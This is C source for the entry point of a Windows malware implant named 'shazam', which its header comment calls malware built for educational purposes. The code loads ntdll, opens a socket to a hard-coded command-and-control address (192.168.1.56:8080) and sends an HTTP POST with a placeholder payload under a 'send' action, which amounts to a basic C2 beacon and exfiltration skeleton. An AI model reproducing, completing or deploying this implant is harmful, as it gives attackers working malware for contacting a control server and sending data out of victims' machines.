/*
* shazam v0.1
* by synawk - g
*
* -- malware desarrollado con fines educativos
*/
#include "http.h"
#include "shazam.h"


#define C2IP "192.168.1.56"
#define C2PORT 8080


//entrypoint
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char *nCmdLine, int nShowCmd) {

    ntWrapper = readNtdll();
    //szSocket = (SZSOCKET *)malloc(sizeof(SZSOCKET));

    init_conn(&szSocket); //wsa

    session = (SESSION_CONTEXT *)malloc(sizeof(SESSION_CONTEXT));

    session->pid = GetCurrentProcessId();

    fdebug("[*] Modules loaded...");
    fdebug("\n\n[SHAZAM][*] shazam started");
    fdebug("[*]GetCurrentProcessId [%d]", session->pid);

    HTTPCONNECTION httpHandle;

    char ipPort[17];
    sprintf(ipPort,"%s:%d", C2IP,C2PORT);
    szHttp_New(ipPort, &httpHandle);

    szHttp_Instance(&httpHandle);
    fdebug("Connected: %s\n", httpHandle.ip);

    
    char *data = malloc(100 * sizeof(char));
    memcpy(data, "Este es un archivo\0", 20);
    szHttp_MakePost(&httpHandle, SZAC_SEND, data);
    fdebug("response: %s", httpHandle.response);

    return 0;
}
